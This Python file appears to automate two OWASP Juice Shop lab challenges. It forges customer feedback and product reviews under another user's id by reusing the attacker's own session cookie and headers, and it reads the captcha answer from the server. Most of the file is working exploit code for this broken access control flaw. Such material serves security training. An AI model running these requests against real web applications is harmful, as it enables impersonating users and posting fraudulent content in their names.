"""
This file is to automate the OWASP JUICESHOP TASK
FORGED FEEDBACK
FORGED REVIEW
The basic idea behind is to give a feedback/review in the name of other people
We will use user A's header and cookie to send post with username B
"""

import time
from plugins import attack as a
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

class forged(a.attack_inter):

    def __init__(self, aEmail, vEmail):
        self.juice_session = a.requests.session()
        self.email = aEmail
        self.victim_email = vEmail
        self.set_info()
        self.comment = 'I like orange Juice'
        self.rating = 5


    def set_info(self):
        self.userid = a.get_userId(self.email)
        self.forgeId = a.get_userId(self.victim_email)
        self.cookie, self.header = a.get_auth(self.email)
        self.author = self.victim_email
        self.captchaId, self.captcha, self.captchaAns = self.load_captcha()

    def generator(self):
        pass

    def load_captcha(self):
        print('-----------------------------------------')
        print('Let us get the captcha ------------------')
        url = a.URL + '/rest/captcha/'
        response = self.juice_session.get(url, cookies=self.cookie, headers=self.header)
        return response.json()["captchaId"], response.json()["captcha"], response.json()["answer"]

    def forged_feedback(self):
        print("------------------------------------------")
        print("Let us forge other's feedback ------------")
        url = a.URL + '/api/Feedbacks/'
        json_data = {
            'UserId': self.forgeId,
            'captchaId': self.captchaId,
            'captcha': self.captchaAns,
            'comment': self.comment,
            'rating': self.rating,
        }
        response = self.juice_session.post(url, cookies=self.cookie, headers=self.header, json=json_data)
        print(response.text)
        if response.status_code == 201:
            print("The original user has id")
            print(self.userid)
            print("The forged user has id")
            print(self.forgeId)
            print(response.json()["data"])
        print(response.status_code)

    def forged_review(self):
        print("------------------------------------------")
        print("Let us forge other's review --------------")
        url = a.URL + '/rest/products/{}/reviews'.format(self.forgeId)
        json_data = {
            'message': 'I like orange Juice',
            'author': self.author,
        }
        response = self.juice_session.put(url, cookies=self.cookie, headers=self.header, json=json_data)
        print(response.text)

    def run(self):
        a.logging.basicConfig(filename='./test_logging_info.log', 
                            level=a.logging.INFO, format='%(asctime)s %(message)s')
        a.logging.Formatter.converter = time.gmtime
        logger = a.logging.getLogger("Forged Feedback")
        a.logging.info(logger)
        a.logging.info('Started')
        self.forged_feedback()
        a.logging.info('Finshed')

        logger_review = a.logging.getLogger("Forged Review")
        a.logging.info(logger_review)
        self.forged_review()
        a.logging.info('Finshed')



